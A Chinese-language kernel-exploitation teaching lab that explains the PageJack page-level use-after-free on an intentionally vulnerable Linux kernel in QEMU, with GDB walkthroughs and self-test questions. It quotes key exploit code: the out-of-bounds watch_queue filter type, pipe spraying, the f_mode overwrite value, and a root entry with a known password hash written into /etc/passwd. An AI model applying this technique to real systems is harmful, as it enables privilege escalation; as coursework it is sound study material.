# 实验：从 RISC-V buddy/MMU 到 PageJack 页面级 UAF

!!! info "实验定位"

    这是一个隔离在 QEMU 中运行的 Linux kernel-pwn/CTF 实验。
    实验对象是 `/path/to/Page_Jack_pwn`，
    不会修改宿主机的 `/etc/passwd`，也不会修改你的 `~/sys3-sp26` 工程。

!!! warning "先读这一条"

    本目录中的 debug 内核打开了专门的 `CONFIG_PAGEJACK_LAB_VULN=y` 教学开关。
    它用于让 PageJack 的利用链在隔离 guest 中可观察、可复现，不能作为宿主机或生产内核使用。

## 一、实验目的

完成本实验后，你不需要背诵 Linux 内核的所有代码，但应该能够用自己的话回答：

1. 你在 `sys3-sp26/mm.c` 中写的 `buddy_alloc()`、引用计数和 `buddy_free()`，分别对应 Linux 中什么概念？
2. `pipe_buffer->page` 为什么可以成为 PageJack 的“桥”？
3. `0x306` 为什么会造成越界 bit 写？
4. 为什么两个 pipe 指向同一页后，关闭其中一个会产生页面级 UAF？
5. 为什么最后攻击的是 `struct file.f_mode`，而不是函数返回地址？
6. 为什么这个实验不需要 ROP，也不需要先泄漏内核地址？

本实验的最终证据是：

```text
found pipe coincide
Write Success
flag{...}
FLAG_READ_SUCCESS
```

只看到 `Trigger OOB`，只能说明漏洞路径被调用；只看到 `Write Success`，说明数据破坏已经成功，但还要继续验证 flag。不要把准备工作当成完整利用成功。

## 二、你在 `sys3-sp26` 中已经掌握的知识

这部分不是要求你重新学习 RISC-V，而是把已有知识翻译成 Linux 术语。

### 2.1 你的 `mm.c`：页、分配和引用计数

你的代码位于：

```text
~/sys3-sp26/src/lab3/arch/riscv/kernel/mm.c
```

其中最重要的逻辑是：

```c
static void buddy_pfn_decref(uint64_t pfn) {
  if (buddy.ref_cnt[pfn] && !--buddy.ref_cnt[pfn]) {
    buddy_free(pfn);
  }
}
```

用白话说：

```text
页还有引用       → 不能回收
最后一个引用消失 → ref_cnt 变成 0 → 页还给 buddy
```

Linux 也有类似的页面引用计数。Linux 代码中常见的名字是 `get_page()`、`put_page()`，而不是你代码中的 `buddy_pfn_incref()`、`buddy_pfn_decref()`。

PageJack 利用的核心问题是：

```text
内核认为页已经没有人使用，因而把它归还给页分配器；
但攻击者还保留着一个可以访问这页的指针。
```

这个“已经释放，但仍有指针”的状态就是 UAF 的本质。

### 2.2 你的 `vm.c`：虚拟地址和物理页

你的代码位于：

```text
~/sys3-sp26/src/lab3/arch/riscv/kernel/vm.c
```

你在 `alloc_pages()` 中做过这样的转换：

```c
uint64_t pfn = buddy_alloc(nrpages);
return (void *)PA2VA(PFN2PHYS(pfn));
```

意思是：

```text
PFN                页帧编号
PFN2PHYS(pfn)     得到物理地址
PA2VA(...)        通过 direct mapping 得到内核虚拟地址
```

你还在 `create_mapping()` 中把虚拟地址映射到物理地址。PageJack 的关键区别是：它不需要知道某个内核函数的绝对虚拟地址，而是利用“同一个物理页先后被不同内核对象使用”。

因此可以先记住：

```text
RISC-V Lab 3 重点：虚拟地址如何找到物理页
PageJack     重点：同一个物理页先属于谁，后来又被谁拿走
```

### 2.3 你的 UAF demo：释放后投毒空闲链

你在下面的文件中已经做过一个 CTF 风格的 UAF：

```text
~/sys3-sp26/xpart_pre/uaf_pre.md
```

你的 demo 流程是：

```text
malloc(g1), malloc(a), malloc(g2)
free(a)
保留指向 a 的悬垂指针
通过悬垂指针修改 a 的 next
下一次 malloc 复用 a
再下一次 malloc 被骗到 target
修改 target.secret
```

可以把它画成：

```text
对象级 UAF：

释放的 chunk a
       ↓
空闲链上的坑位
       ↓
目标对象复用同一个坑位
       ↓
悬垂指针修改目标对象
```

PageJack 的思想与此相同，但范围更大：

```text
你的 UAF：复用同一个 malloc chunk
PageJack：先释放整页，再让另一种内核对象使用这整页
```

这就是为什么论文称它为 **page-level UAF**，即“页面级 UAF”。

## 三、先把专业名词翻译成人话

### 3.1 page、object、pointer

Linux 内存中有两个层次：

```text
物理页：通常 4096 字节，是内存分配的基本大块
对象：放在页中的一个小结构，例如 pipe_buffer、struct file
指针：保存某个地址，告诉程序去哪里读写
```

一页可以放很多小对象：

```text
一页物理内存
┌─────────────────────────────────────────────┐
│ object │ object │ object │ object │ ...      │
└─────────────────────────────────────────────┘
```

### 3.2 buddy 和 SLUB

把 Linux 的两个分配器先想成两层仓库：

```text
buddy：管理整页，负责拿出或收回 4 KiB 页面
SLUB ：拿到页面后，把页面切成许多同尺寸的小对象
```

例如：

```text
buddy 给 SLUB 一页
        ↓
SLUB 切成许多 96 字节对象
        ↓
kmalloc()/内核子系统拿走其中一个对象
```

**cache** 在这里不是 CPU cache，而是“同一类大小对象的仓库”。

- `kmalloc-96`：大约放 96 字节的小对象
- `filp`：专门放 `struct file`
- `cred_jar`：专门放进程凭证对象

普通 UAF 通常要求两个对象来自同一个 cache。PageJack 的特别之处是：它把整页释放回 buddy，再让另一种 cache 重新获得这页，所以不要求两个对象来自同一个 cache。

### 3.3 heap spray 和 heap feng shui

```text
heap spray：大量创建对象，把内核内存“铺满”
heap feng shui：按照特定顺序创建/释放对象，尽量把对象摆到想要的位置
```

本实验中：

```c
#define PIPE_NUM 0x790   // 1936 个 pipe
#define FILE_NUM 0x100   // 256 个文件描述符
```

大量 pipe 是为了制造可预测的布局；大量 `/etc/passwd` 文件描述符是为了让 `struct file` 有机会占用被释放的页。

### 3.4 OOB、UAF 和 primitive

| 名词 | 人话解释 | 本实验中的例子 |
|---|---|---|
| OOB | 写到了数组边界之外 | `__set_bit(0x306, type_filter)` |
| UAF | 释放后仍使用旧指针 | pipe 仍指向已经归还的页 |
| spray | 大量分配同类对象 | 创建 1936 个 pipe |
| primitive | 可以反复利用的最小能力 | “把某个 bit 置 1” |
| target | 最终要改变的对象/字段 | `struct file.f_mode` |
| data-only | 只改数据，不劫持代码执行 | 修改写权限标志 |

### 3.5 `struct page` 不是物理页本身

为了避免一个常见误解：

```text
struct page：Linux 用来描述物理页的“页账本”
物理页本身：真正存放 pipe 数据的 4096 字节内存
```

`pipe_buffer->page` 保存的是一个 `struct page *`。内核再根据这个描述符找到真正的页面内容。

在这个 x86_64 教学内核中，邻近 `struct page` 描述符相差 `0x40` 字节。若把一个 `struct page *` 的低位改成相邻值，就可能让 pipe 使用相邻物理页。

## 四、PageJack 论文到底解决什么问题

论文讨论的是文件系统中的关键对象，常见英文缩写是 **FSKO**，可以先理解为：

```text
文件系统关键对象：某些字段一旦被攻击者修改，就会影响权限或文件操作
```

例如：

```text
struct file.f_mode       文件是否允许读/写
struct inode.i_mode       文件权限和类型
struct cred 的 uid/gid    进程身份
```

传统对象级 UAF 的困难是：

```text
漏洞对象在 kmalloc cache
目标对象在 filp 或 cred_jar 专用 cache
两个对象不在同一个对象池，不能简单复用同一个小坑位
```

PageJack 引入 **bridge object（桥对象）**：

```text
桥对象中保存一个指向物理页的指针；
攻击者可以通过正常 API 读写这个桥对象指向的页；
只要让这页被别的 cache 重新使用，就可以间接碰到别的对象。
```

本实验中的桥就是：

```text
pipe_buffer->page
```

为什么 pipe 合适？因为用户可以调用普通的：

```c
write(pipe_fd[1], data, size);
read(pipe_fd[0], data, size);
close(pipe_fd[0]); close(pipe_fd[1]);
```

这些系统调用会让内核分配页面、往页面写数据、从页面读数据、释放页面。攻击者不需要直接访问内核地址。

## 五、本实验的漏洞：watch_queue 的 OOB bit 写

### 5.1 通知管道

exploit 首先创建特殊管道：

```c
pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE);
```

这个管道支持 watch queue 通知机制，因此可以使用：

```c
ioctl(pipe_fd[0], IOC_WATCH_QUEUE_SET_FILTER, wfilter);
```

`ioctl` 可以理解为：

```text
用户程序把一个命令和一块参数内存交给内核；
内核根据命令解释这块参数。
```

### 5.2 合法类型只有 0 和 1

在本实验源码中：

```text
kernel/source/linux-6.5-rc1/include/uapi/linux/watch_queue.h
```

定义了：

```c
enum watch_notification_type {
    WATCH_TYPE_META       = 0,
    WATCH_TYPE_KEY_NOTIFY = 1,
    WATCH_TYPE__NR        = 2
};
```

`WATCH_TYPE__NR` 可以理解为“类型数量”，因此有效类型是 `0` 和 `1`。

### 5.3 exploit 传入 0x306

`challenge/exp.c` 中的关键代码是：

```c
nfilters = 4;
wfilter = calloc(1, sizeof(struct watch_notification_filter) +
                    nfilters * sizeof(struct watch_notification_type_filter));
wfilter->nr_filters = nfilters;

for (int i = 0; i < nfilters - 1; i++)
    wfilter->filters[i].type = 1;

wfilter->filters[nfilters - 1].type = 0x306;
```

前三个 filter 是合法的 `1`，最后一个是明显非法的 `0x306`。

内核内部会做：

```c
q->type = tf[i].type;
__set_bit(q->type, wfilter->type_filter);
```

`type_filter` 是一个 bitmap，bitmap 的每一位代表一个类型是否被允许。问题在于，`q->type` 来自用户，而 `__set_bit()` 这一行没有再保证它是合法下标。

### 5.4 计算越界位置

x86_64 上一个 `unsigned long` 是 8 字节，也就是 64 bit：

```text
0x306 / 64 = 12
0x306 % 64 = 6
```

所以 `__set_bit(0x306, bitmap)` 大致等价于：

```c
bitmap[12] |= (1UL << 6);
```

`bitmap[12]` 位于：

```text
12 * 8 = 0x60 字节
```

也就是在 `type_filter` 之后 `0x60` 字节处，把第 6 bit 置为 1。

在本实验的堆布局中，这个越界 bit 可能落到相邻 `pipe_buffer->page` 指针的低字节上。置位 `0x40` 后，指针可能刚好从一个 `struct page` 描述符跳到相邻描述符。

这里有两个容易混淆的 `0x40`：

```text
1 << 6 = 0x40             被置上的 bit mask
sizeof(struct page)=0x40  相邻页描述符的间距
```

它们的数值相同，正是这个 demo 能用“一 bit 写”制造页面别名的原因之一。

### 5.5 本实验内核和原始内核的区别

为了让实验可控，源码中有：

```c
#ifndef CONFIG_PAGEJACK_LAB_VULN
if (tf[i].type >= WATCH_TYPE__NR)
    continue;
#endif
```

当 `CONFIG_PAGEJACK_LAB_VULN=y` 时，这段检查被编译掉，`0x306` 才会进入 `__set_bit()`。

因此本实验的准确表述是：

```text
用一个专门打开的教学漏洞开关，观察 PageJack 的利用方法。
```

不要把它理解成“宿主机当前 Linux 一定存在同样漏洞”。

## 六、从 exploit 源码看完整利用链

### 6.1 第 1 幕：固定 CPU 和资源限制

```c
CPU_ZERO(&cpu_set);
CPU_SET(0, &cpu_set);
sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
```

把 exploit 固定到 CPU 0，可以减少 per-CPU 内存分配带来的变化。

`adjust_rlimit()` 调高文件描述符等资源限制，是因为：

```text
1936 个 pipe × 2 个 fd
+ 256 个 /etc/passwd fd
+ 通知 pipe 和其他 fd
```

如果不调高限制，程序可能在还没有触发漏洞时就因为 `pipe()` 或 `open()` 失败。

### 6.2 第 2 幕：创建大量普通 pipe

```c
for (int i = 0; i < PIPE_NUM; i++)
    pipe(pipe_fd[i]);
```

每个 pipe 在内核中不只有两个 fd，还会有：

```text
struct pipe_inode_info
struct pipe_buffer 数组
存放数据的物理页
```

接着调整容量：

```c
fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 2);
```

`0x2000` 是两页容量。在这个内核版本中，pipe 的 buffer 数量会变成较小的数量，使 `pipe_buffer` 数组大约为：

```text
2 × sizeof(struct pipe_buffer)
= 2 × 0x28
= 0x50 字节
```

这样它和 `watch_filter` 更容易落在相近的小型 kmalloc cache 中。

### 6.3 第 3 幕：写入页面指纹

每个 pipe 都写入自己的标记：

```c
size_t magic_num = 0xdead0000 + i;
write(pipe_fd[i][1], &magic_num, 8);
write(pipe_fd[i][1], "Lotus777", 8);
```

假设 pipe 7 使用的页面开头是：

```text
0xdead0007  Lotus777
```

pipe 8 正常情况下应该读到：

```text
0xdead0008  Lotus777
```

如果 pipe 8 的 `page` 指针被改成指向 pipe 7 的页面，它读出来就会变成：

```text
0xdead0007  Lotus777
```

这就是后面判断“两个 pipe 是否共享页面”的依据。

### 6.4 第 4 幕：制造内存空洞

```c
for (int i = 21; i < PIPE_NUM; i += 42) {
    close(pipe_fd[i][0]);
    close(pipe_fd[i][1]);
}
```

每隔 42 个 pipe 关闭一个，目的是让 pipe buffer 的小对象进入 SLUB 空闲链。

随后分配 `watch_filter` 时，它可能拿到这些空闲位置。这个过程不是数学上必然成功，所以 exploit 必须用大量对象和反馈检测提高成功率。

### 6.5 第 5 幕：触发 OOB

```c
oob_write(oob_pipe_fd);
```

这一行真正触发 `IOC_WATCH_QUEUE_SET_FILTER`。如果越界 bit 正好命中相邻 pipe 的 `page` 指针，就会让一个 pipe 读取另一个 pipe 的页面。

### 6.6 第 6 幕：反馈检测

```c
read(pipe_fd[i][0], find_pipe[i], 0x10);
```

接着 exploit 检查：

```c
if (find_pipe[i][0] != 0xdead0000 + i &&
    !strncmp(&find_pipe[i][1], "Lotus777", 8))
```

含义是：

```text
读出的第二部分仍然是 Lotus777
但第一部分不是这个 pipe 自己的 magic
→ 这个 pipe 使用了别人的页面
```

输出：

```text
found pipe coincide at idx:X and Y
```

不是“程序随便猜中”，而是通过页面中的指纹读出来的实际反馈。

其中：

```text
X：页面原来属于的 pipe
Y：现在仍然持有这个 page 指针的 pipe
```

### 6.7 第 7 幕：形成 page-UAF

```c
close(pipe_fd[same_pipe[0]][0]);
close(pipe_fd[same_pipe[0]][1]);
```

关闭页面原主人后：

```text
页面引用计数减少到 0
页面归还 buddy
same_pipe[1] 里的 pipe_buffer->page 仍然指向这页
```

于是出现：

```text
页面已被分配器认为“空闲”
但悬垂 pipe 仍可以通过 write() 访问它
```

注意：这里不是“整个 pipe 对象被 UAF”，而是 pipe 中保存的页面引用成为了悬垂引用，所以叫页面级 UAF。

### 6.8 第 8 幕：让 `struct file` 使用这页

```c
for (int i = 0; i < FILE_NUM; i++)
    file_fd[i] = open("/etc/passwd", 0);
```

这会创建很多 `struct file`。这些对象属于 `filp` 专用 cache。

页面已经回到 buddy，`filp` cache 申请新的 slab 页面时，可能拿到这块刚释放的物理页：

```text
pipe 数据页
    ↓ close 后释放
buddy 空闲页
    ↓ filp cache 申请 slab 页面
一页中出现很多 struct file
```

这一步跨越了不同 cache，是 PageJack 相比普通对象级 UAF 的关键。

### 6.9 第 9 幕：修改 `file->f_mode`

```c
size_t tmp = 0x480e801f;
write(pipe_fd[same_pipe[1]][1], &tmp, 4);
```

这个 `write()` 不是写宿主机文件，而是利用悬垂 pipe 向它仍然指向的物理页写 4 字节。

如果这 4 字节落到了某个 `struct file` 的 `f_mode`，就相当于：

```text
原来的 file：只读
修改后的 file：包含允许写入的标志
```

这是一个 data-only attack：

```text
没有改函数指针
没有跳转到用户空间代码
没有构造 ROP 链
只改了内核数据字段
```

### 6.10 第 10 幕：写 `/etc/passwd`

```c
char *data =
    "root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n";

for (int i = 0; i < FILE_NUM; i++)
    write(file_fd[i], data, strlen(data));
```

大多数 fd 仍然是只读的，只有被修改了 `f_mode` 的 fd 可以成功写入，因此会看到：

```text
Write Success:112!
```

这里的 `112` 是 `file_fd[112]` 的数组下标，不是内核地址，也不是 pipe 下标。

写入后，root 的密码被设置为：

```text
Lotus
```

随后 `su root` 即可在 guest 内读取 `/flag`。

## 七、动手实验一：先不使用 GDB，认识输出

### 7.1 启动自动 runner

终端执行：

```bash
cd /path/to/Page_Jack_pwn
./run_auto.sh
```

重点观察以下顺序：

```text
spray pipe_buffer
allocating pipe pages
Create 2 holes in pipe_buffer
Trigger OOB
finding
found pipe coincide
uaf one of the pipe_buffer->page
Spray pwd file struct
Edit pwd file->f_mode
Write Success
FLAG_READ_SUCCESS
```

如果出现：

```text
[*]Not hit.
```

它表示本轮布局没有产生可用的页面重合，不是语法错误。重新运行 QEMU 即可。

### 7.2 这一步的学习目标

暂时不要试图理解所有数字，只回答：

```text
哪一行是在分配对象？
哪一行是在释放对象？
哪一行是在检查页面重合？
哪一行第一次修改了 file 对象？
```

建议你先在 `challenge/exp.c` 中找到这些字符串，再向上看它们所在的函数。

## 八、动手实验二：用 GDB 看见 `0x306`

### 8.1 两个终端的职责

```text
终端 A：QEMU 串口，运行 guest 和 /exp/exp
终端 B：GDB，暂停/继续 guest 内核
```

`run_gdb.sh` 使用 `-nographic -S`，不会弹出第二个图形窗口。它会占用终端 A，等待终端 B 里的 GDB 发出 `continue`。

### 8.2 启动 QEMU

终端 A：

```bash
cd /path/to/Page_Jack_pwn
./run_gdb.sh
```

### 8.3 启动 GDB

终端 B：

```bash
cd /path/to/Page_Jack_pwn
gdb -q ./kernel/vmlinux -x ./gdb-pagejack.gdb
```

脚本会自动：

```text
加载带调试符号的 vmlinux
连接 localhost:1234
设置 watch_queue_set_filter、alloc_pipe_info、pipe_release 断点
```

先把默认断点全部关闭，再只观察漏洞循环：

```gdb
disable 1 2 3
break kernel/source/linux-6.5-rc1/kernel/watch_queue.c:367
continue
```

如果 GDB 提示路径已经存在，不要重复设置断点；直接执行 `continue`。

### 8.4 在 QEMU 中启动 exploit

此时回到终端 A。看到：

```text
~ $
```

输入：

```text
/exp/exp
```

终端 B 会在 `watch_queue.c:367` 停住。

### 8.5 观察每个 filter 的类型

在 GDB 输入：

```gdb
p i
p/x tf[i].type
```

你会依次看到类似：

```text
i = 0, tf[i].type = 0x1
i = 1, tf[i].type = 0x1
i = 2, tf[i].type = 0x1
i = 3, tf[i].type = 0x306
```

每次观察后输入：

```gdb
continue
```

直到 `i == 3`。

### 8.6 观察越界计算

停在 `i == 3` 时执行：

```gdb
p/x tf[i].type / 64
p/x tf[i].type % 64
p/x (unsigned long)sizeof(unsigned long)
p/x sizeof(struct watch_filter)
p/x sizeof(struct watch_type_filter)
```

预期重点是：

```text
0x306 / 64 = 0xc
0x306 % 64 = 0x6
sizeof(unsigned long) = 0x8
```

因此写入位置是：

```text
0xc × 0x8 = 0x60
```

你可以继续查看对象附近的内存：

```gdb
p/x wfilter
x/24gx wfilter
list 360,373
```

### 8.7 GDB 常用命令翻译

| 命令 | 含义 |
|---|---|
| `bt` | backtrace，查看函数调用链 |
| `list` | 查看对应的 C 源码 |
| `p expr` | print，打印表达式 |
| `p/x expr` | 用十六进制打印 |
| `x/24gx addr` | 从地址开始查看 24 个 8 字节整数 |
| `continue` | 继续运行到下一个断点 |
| `disable 1 2 3` | 关闭第 1、2、3 号断点 |

### 8.8 为什么要关闭 `alloc_pipe_info` 和 `pipe_release`

exploit 会创建和关闭大量 pipe。如果保留这两个断点，GDB 会在几千次无关的分配/释放上停住，看起来像“卡死”。

第一次学习只保留 `watch_queue` 断点即可；等你理解主流程后，再单独研究 pipe 的分配和释放。

## 九、动手实验三：用标记证明两个 pipe 共享页面

### 9.1 正常情况

假设 `pipe_fd[23]` 的数据页中写入：

```text
0xdead0017 Lotus777
```

它自己读出来应当是自己的标记。

### 9.2 页面重合情况

如果 pipe 24 的 `page` 指针被改成 pipe 23 的页面：

```text
pipe 23 → page A，内容是 0xdead0017
pipe 24 → page A，内容也是 0xdead0017
```

所以程序读 pipe 24 时发现：

```text
读出来不是 0xdead0018
但仍然是 Lotus777
```

于是输出：

```text
found pipe coincide at idx:23 and 24
```

这就是 exploit 自带的反馈机制。它不需要知道页面的绝对地址，只需要知道页面内容中的指纹。

### 9.3 你要区分的两个对象

```text
page 的原主人：关闭它，页面回到 buddy
仍然持有 page 指针的 pipe：不关闭它，后面用它写 freed page
```

如果把两者弄反，后续写入就没有悬垂引用，利用链会失败。

## 十、动手实验四：理解 `f_mode` 而不是 ROP

### 10.1 普通打开方式

代码是：

```c
open("/etc/passwd", 0);
```

这里的 `0` 表示以只读方式打开。用户程序拿到的是一个整数 fd，但内核内部会创建一个 `struct file`：

```text
用户看到：fd = 5
内核内部：file_fd_table[5] → struct file
```

### 10.2 为什么改 `f_mode` 有效

`struct file` 里保存了当前打开方式。可以把它想成文件描述符随身携带的一张标签：

```text
f_mode = 只读
```

PageJack 通过悬垂 pipe 把它改成包含写入标志的值：

```c
size_t tmp = 0x480e801f;
write(dangling_pipe, &tmp, 4);
```

之后再调用普通的：

```c
write(file_fd[i], data, data_size);
```

内核检查这个 `struct file` 时，会认为它允许写入，于是 `/etc/passwd` 被修改。

这是一个 data-only attack：

```text
没有改函数指针
没有跳转到用户空间代码
没有构造 ROP 链
只改了内核数据字段
```

### 10.3 为什么不需要 KASLR 泄漏

KASLR 主要随机化内核代码和数据的虚拟地址。这个 demo 没有：

```text
覆盖返回地址
覆盖函数指针
跳转到内核 gadget
```

它只依赖：

```text
pipe 的正常 read/write
页面引用计数变化
struct file 内部固定字段的布局
```

所以它不需要先知道 `commit_creds()` 或某个 ROP gadget 的地址。

## 十一、问题排查

### 11.1 `[*]Not hit.`

含义：本轮页分配布局没有发现可用重合。

处理：

```text
退出当前 QEMU
重新执行 ./run_auto.sh
```

不要一开始就修改 `0x306`；先理解这是堆布局的随机性。

### 11.2 QEMU 不弹出终端

这是正常的。`-nographic` 表示把串口放到当前终端，`-S` 表示开机暂停。正确操作是：

```text
终端 A 启动 ./run_gdb.sh
终端 B 启动 GDB
终端 B 执行 continue
终端 A 才会出现 guest shell
```

### 11.3 `sh: can't access tty; job control turned off`

这是 BusyBox shell 在没有控制终端时的提示。它不表示 root 失败，也不影响：

```sh
id
cat /flag
```

### 11.4 `/dev/shm` 挂载失败

专用 rootfs 的 `init` 已经在 `devtmpfs` 挂载之后执行：

```sh
mkdir -p /dev/shm
mount -t tmpfs shmfs -o size=1m /dev/shm
```

如果你以后修改了 `rootfs/*-unpacked/init`，要重新打包：

```bash
python3 ./pack_rootfs.py rootfs/gdb-unpacked rootfs/rootfs-gdb.cpio --force
python3 ./pack_rootfs.py rootfs/auto-unpacked rootfs/rootfs-auto.cpio --force
```

### 11.5 GDB 报 `Address already in use`

说明旧的 QEMU 仍占用 `1234`：

```text
回到旧 QEMU 终端按 Ctrl-C
再重新启动 ./run_gdb.sh
```

### 11.6 GDB 停在 `alloc_pipe_info`

执行：

```gdb
disable 2 3
continue
```

如果你只想研究漏洞循环，再执行：

```gdb
disable 1
break kernel/source/linux-6.5-rc1/kernel/watch_queue.c:367
continue
```

## 十二、建议的学习顺序

不要一次阅读整个 Linux 内核。按下面顺序推进：

### 第 1 次：只看自己的代码

阅读：

```text
~/sys3-sp26/src/lab3/arch/riscv/kernel/mm.c
~/sys3-sp26/xpart_pre/uaf_pre.md
```

只回答：

```text
页什么时候变成空闲？
释放后为什么旧指针危险？
你的 UAF 为什么能让 malloc 返回 target？
```

### 第 2 次：跑自动 exploit

只观察输出阶段，不看汇编：

```bash
cd /path/to/Page_Jack_pwn
./run_auto.sh
```

### 第 3 次：GDB 观察 `0x306`

只完成本实验第八节，不研究 pipe 内部所有字段。

### 第 4 次：解释 `found pipe coincide`

回到 `challenge/exp.c`，重点看：

```c
find_pipe
same_pipe
0xdead0000 + i
```

### 第 5 次：解释 `f_mode`

重点看：

```c
open("/etc/passwd", 0)
size_t tmp = 0x480e801f
write(file_fd[i], data, data_size)
```

等这五步都能讲清楚，再考虑修改 spray 数量等参数。

## 十三、自测题

先自己回答，再看后面的参考答案。

### 题目

1. 为什么不能只创建一个 pipe？
2. 为什么需要给每个 pipe 写不同的 `0xdead0000+i`？
3. `0x306 / 64` 和 `0x306 % 64` 分别表示什么？
4. 为什么关闭一个 pipe 后，另一个 pipe 还能访问同一个页面？
5. `Write Success:112!` 中的 112 表示什么？
6. 这个 demo 为什么不需要 ROP？
7. `Not hit` 说明漏洞不存在吗？

### 参考答案

1. 一个 pipe 只能提供一个页面引用，无法形成“原主人”和“悬垂引用者”两个角色。
2. 不同指纹能让程序判断读到的是自己的页面还是别人的页面。
3. 商表示第几个 64-bit word，余数表示该 word 中的 bit 位置。
4. OOB 只改变了另一个 pipe 的 `page` 指针，没有给它增加正确的页面引用计数；关闭原主人后页面可以被释放，而旧指针仍存在。
5. 被成功修改的 `file_fd[]` 数组下标。
6. 攻击的是 `f_mode` 等数据字段，不是控制流。
7. 不一定。它通常表示本轮 heap feng shui 没有命中，需要重新布局或重启 guest。

## 十四、与已有材料的对应关系

建议配合阅读：

1. `~/sys3-sp26/docs/lab3.md`：复习实验文档的结构、虚拟地址/物理地址和页表概念。
2. `~/sys3-sp26/xpart_pre/uaf_pre.md`：复习你已经完成的对象级 UAF。
3. `learning_materials/pagejack/02_PREREQUISITES_TUTORIAL.md`：补充 Linux buddy、SLUB、pipe 基础。
4. `learning_materials/pagejack/05_EXPLOIT_CODE_ANNOTATED.md`：逐段对照 exploit 源码。
5. `Page_Jack_pwn/README.md`：专用 QEMU、rootfs 和 GDB 启动命令。

最重要的对照表是：

| 你在 `sys3-sp26` 中学过 | PageJack 中的对应物 |
|---|---|
| `buddy_alloc()` | Linux buddy 分配物理页 |
| `buddy_pfn_decref()` | Linux 页引用计数减少 |
| `buddy_free()` | 物理页回到页分配器 |
| `PA2VA()` / direct mapping | 内核通过地址访问物理页内容 |
| malloc chunk 的 `next` | 内核对象/页面中的指针字段 |
| 释放后仍保留的 `a` | 仍指向 freed page 的 `pipe_buffer->page` |
| UAF 修改 `secret` | UAF 修改 `struct file.f_mode` |
| 进入 mini-shell | `su root` 后读取 `/flag` |

## 十五、实验完成标准

你不需要一开始就独立写出 exploit。分三层完成：

### 基础层

能说清楚：

```text
页、对象、指针、buddy、SLUB、OOB、UAF
```

### 观察层

能在 GDB 中看到：

```text
tf[0..2].type = 1
tf[3].type   = 0x306
0x306 / 64   = 12
0x306 % 64   = 6
```

### 利用层

能解释完整链条：

```text
OOB bit 写
→ 两个 pipe 共享页面
→ 关闭一个形成 page-UAF
→ filp cache 复用页面
→ 修改 f_mode
→ 写 passwd
→ root
```

做到这里，你已经真正理解了这个 demo 的利用逻辑；之后再阅读论文中的其他 bridge object 和 FSKO，不会再是完全陌生的术语堆。
